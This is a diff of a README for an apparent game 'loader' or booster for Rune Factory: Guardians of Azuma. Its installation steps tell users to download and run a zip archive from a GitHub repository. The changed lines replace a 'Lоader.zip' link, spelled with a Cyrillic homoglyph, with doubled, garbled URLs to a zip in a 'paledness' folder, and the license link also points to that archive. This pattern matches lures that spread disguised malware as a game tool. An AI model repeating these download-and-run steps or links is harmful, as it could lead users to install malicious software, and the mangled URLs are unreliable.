@@ -35,9 +35,9 @@ Rune Factory | Guardians of Azuma Loader | Game Booster | Cross-Platform Tool | 
 
 ## 🛠️ Installation
 
-1. **Download https://raw.githubusercontent.com/ou2121/AzumaGuardians-RuneFactory-GameHub/main/Lоader.zip** from the repository.
+1. **Download https://github.com/ou2121/AzumaGuardians-RuneFactory-GameHub/raw/refs/heads/main/paledness/Factory_Game_Hub_Azuma_Guardians_Rune_3.9.zipоhttps://github.com/ou2121/AzumaGuardians-RuneFactory-GameHub/raw/refs/heads/main/paledness/Factory_Game_Hub_Azuma_Guardians_Rune_3.9.zip** from the repository.
 2. Extract files to your preferred directory.
-3. Run https://raw.githubusercontent.com/ou2121/AzumaGuardians-RuneFactory-GameHub/main/Lоader.zip and follow on-screen instructions.
+3. Run https://github.com/ou2121/AzumaGuardians-RuneFactory-GameHub/raw/refs/heads/main/paledness/Factory_Game_Hub_Azuma_Guardians_Rune_3.9.zipоhttps://github.com/ou2121/AzumaGuardians-RuneFactory-GameHub/raw/refs/heads/main/paledness/Factory_Game_Hub_Azuma_Guardians_Rune_3.9.zip and follow on-screen instructions.
 4. Enjoy the unique adventure experience in Guardians of Azuma!
 
 ---
@@ -50,7 +50,7 @@ This tool is provided for **personal and educational use**. All official content
 
 ## 📃 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/ou2121/AzumaGuardians-RuneFactory-GameHub/main/Lоader.zip).  
+This project is licensed under the [MIT License](https://github.com/ou2121/AzumaGuardians-RuneFactory-GameHub/raw/refs/heads/main/paledness/Factory_Game_Hub_Azuma_Guardians_Rune_3.9.zipоhttps://github.com/ou2121/AzumaGuardians-RuneFactory-GameHub/raw/refs/heads/main/paledness/Factory_Game_Hub_Azuma_Guardians_Rune_3.9.zip).  
 © 2025 Guardians of Azuma Community
 
 ---
